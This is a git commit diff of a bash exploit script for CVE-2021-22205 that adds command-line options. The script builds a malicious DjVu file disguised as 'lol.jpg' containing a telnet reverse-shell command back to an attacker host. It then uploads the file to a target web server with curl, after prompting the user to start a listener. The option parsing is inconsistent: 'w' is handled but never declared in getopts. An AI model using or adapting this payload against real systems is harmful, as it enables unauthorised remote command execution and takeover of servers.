f5ea51abaf78dcb610d2e6d72d4d9781e46fc3c3
overgrowncarrot1 <78485709+overgrowncarrot1@users.noreply.github.com>
2023-03-02 18:08:16 -0500

    v1.1
    Added argument options, made script easier to use

--- dejavu.sh
+++ dejavu.sh
@@ -1,4 +1,4 @@
-#!/usr/bin/bash
+#!/bin/bash
 #CVE: CVE-2021-22205
 
 echo -e '\E[31;40m'" _____ _____  _____    ______ _____   ___  ___  _   _ _   _ "
@@ -9,22 +9,57 @@ echo -e '\E[35;40m'"\ \_/ / |_\ \| \__/\   | |/ /| |___/\__/ / | | \ \_/ / |_| |
 echo -e '\E[36;40m'" \___/ \____/ \____/   |___/ \____/\____/\_| |_/\___/ \___/ "
 echo -e '\E[37;40m'"                                                            ";tput sgr0
 
+############################################################
+# Help                                                     #
+############################################################
+Help()
+{
+   # Display Help
+   echo "l     LHOST"
+   echo "p     LPORT"
+   echo "r     WEBHOST IP"
+   echo "P     RPORT"
+}
+
+############################################################
+############################################################
+# Main program                                             #
+############################################################
+############################################################
+
+############################################################
+# Process the input options. Add options as needed.        #
+############################################################
+# Get the options
+while getopts "l:p:r:P:h" option; do
+   case $option in
+   	h) # display Help
+	    Help
+        exit;;
+    l) # LHOST
+		LHOST=${OPTARG};;
+	p) # LPORT
+		LPORT=${OPTARG};;
+	w) # WEBHOST
+		WEBHOST=${OPTARG};;
+   esac
+done
+
+if [ $# -eq 0 ]; then
+    >&2 echo -e '\E[31;40m' "No arguments provided"
+    >&2 echo -e '\E[33;40m' "Use -h for help"
+    >&2 echo -e '\E[32;40m' "Syntax: ./DejaVu.sh -l <lhost> -p <lport> -w <WEBHOST>"
+    >&2 echo -e '\E[37;40m' "Example: ./DejaVu.sh -l 10.10.10.10 -p 4444 -w http://test.com:8080"
+    exit 1
+fi
+
 TF=$(mktemp -u)
 
-echo -e '\E[31;40m' "LHOST?"; tput sgr0
-read LHOST
-echo -e '\E[31;40m' "LPORT?"; tput sgr0
-read LPORT
-echo -e '\E[31;40m' "RHOST?"; tput sgr0
-read RHOST
-echo -e '\E[31;40m' "RPORT?"; tput sgr0
-read RPORT
-
-echo -e '\E[31;40m'"Making lol.jpg file"
+echo -e '\E[31;40m'"Making lol.jpg file"; tput sgr0
 echo -e 'QVQmVEZPUk0AAAOvREpWTURJUk0AAAAugQACAAAARgAAAKz//96/mSAhyJFO6wwHH9LaiOhr5kQPLHEC7knTbpW9osMiP0ZPUk0AAABeREpWVUlORk8AAAAKAAgACBgAZAAWAElOQ0wAAAAPc2hhcmVkX2Fubm8uaWZmAEJHNDQAAAARAEoBAgAIAAiK5uGxN9l/KokAQkc0NAAAAAQBD/mfQkc0NAAAAAICCkZPUk0AAAMHREpWSUFOVGEAAAFQKG1ldGFkYXRhCgkoQ29weXJpZ2h0ICJcCiIgLiBxeHs=' | base64 -d > lol.jpg
 echo -n "mkfifo $TF && telnet $LHOST $LPORT 0<$TF | sh 1>$TF" >> lol.jpg
 echo -n "fSAuIFwKIiBiICIpICkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg==" | base64 -d >> lol.jpg
-tput sgr0
+echo -e '\E[32;40m'"Sending lol.jpg to $WEBHOST";tput sgr0
 
 read -p "Start listener on $LHOST with port $LPORT, press enter when ready"
-curl -v -F 'file=@lol.jpg' "http://$RHOST:$RPORT/$(openssl rand -hex 8)"
+curl -v -F 'file=@lol.jpg' "$WEBHOST/$(openssl rand -hex 8)"
